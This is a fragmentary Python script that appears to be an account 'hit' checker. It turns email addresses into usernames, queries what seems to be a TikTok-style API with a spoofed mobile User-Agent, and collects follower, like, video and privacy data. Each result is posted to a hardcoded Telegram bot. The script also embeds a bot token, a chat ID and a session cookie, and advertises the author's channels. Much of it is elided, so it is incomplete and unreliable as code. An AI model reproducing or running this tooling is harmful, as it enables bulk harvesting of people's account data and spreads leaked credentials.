...
Sao= "5775008783" 
SaoTok= "7970616265:AAHTgwvKAYFHiL0Vyt214wDYGrM_ACmqBEE" 
def info(email):
  global hit,Sao,SaoTok
  hit+=1
  email=str(email)
  user = email.split('@')[0]
  try:
...
'User-Agent': 'okhttp/3.14.7',
    ...
    following = r['data']['stats']['followingCount']
    followers = r['data']['stats']['followerCount']
    like =  r['data']['stats']['heartCount']
    vid = r['data']['stats']['videoCount']
    private = r['data']['user']['privateAccount']
...
PRIVATE🫴🏻 : {private}
VIDEO🫱🏽‍🫲🏻 : {vid}
My channel: @SAO_py Py: @SAOpy
   ''')
    requests.post(f"https://api.telegram.org/bot{SaoTok}/sendMessage?chat_id={Sao}&text=" + str(GOODS))
  except:
    GOODS = (f'''
HIT🟢 : {hit}    
NAME🎮  : {name}
...
def para():
	...
	cookies ={
        ...
        "sessionid":"2c8efcdfa0703d52bfdbe30e5a8ce064"
      }
